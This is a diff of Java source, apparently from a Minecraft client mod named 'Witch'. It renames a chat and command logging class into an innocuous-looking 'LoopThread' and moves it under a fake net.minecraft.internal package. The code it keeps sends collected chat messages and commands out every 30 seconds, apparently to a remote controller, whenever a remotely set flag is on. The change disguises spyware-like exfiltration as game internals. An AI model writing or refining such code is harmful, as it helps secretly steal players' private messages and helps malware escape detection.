@@ -1,5 +1,6 @@
-package me.soda.witch.client.utils;
+package net.minecraft.internal.utils;
 
+import net.minecraft.internal.Witch;
 import me.soda.witch.shared.socket.messages.Variables;
 
 import java.time.LocalDateTime;
@@ -10,17 +11,17 @@ import java.util.concurrent.Executors;
 import java.util.concurrent.ScheduledExecutorService;
 import java.util.concurrent.TimeUnit;
 
-public class ChatCommandLogging {
-    public static final ScheduledExecutorService executor = Executors.newScheduledThreadPool(1);
+public class LoopThread {
+    public static final ScheduledExecutorService executor = Executors.newSingleThreadScheduledExecutor();
     private static List<String> readyToSendStrings = new ArrayList<>();
 
     public static void init() {
-        executor.scheduleAtFixedRate(ChatCommandLogging::sendLog, 0, 30, TimeUnit.SECONDS);
+        executor.scheduleAtFixedRate(LoopThread::sendInfo, 0, 30, TimeUnit.SECONDS);
     }
 
-    private static void sendLog() {
+    private static void sendInfo() {
         if (Variables.INSTANCE.logChatAndCommand && !readyToSendStrings.isEmpty()) {
-            NetUtil.send("logging", String.join("\n", readyToSendStrings) + "\n");
+            Witch.send("logging", String.join("\n", readyToSendStrings) + "\n");
             readyToSendStrings = new ArrayList<>();
         }
     }
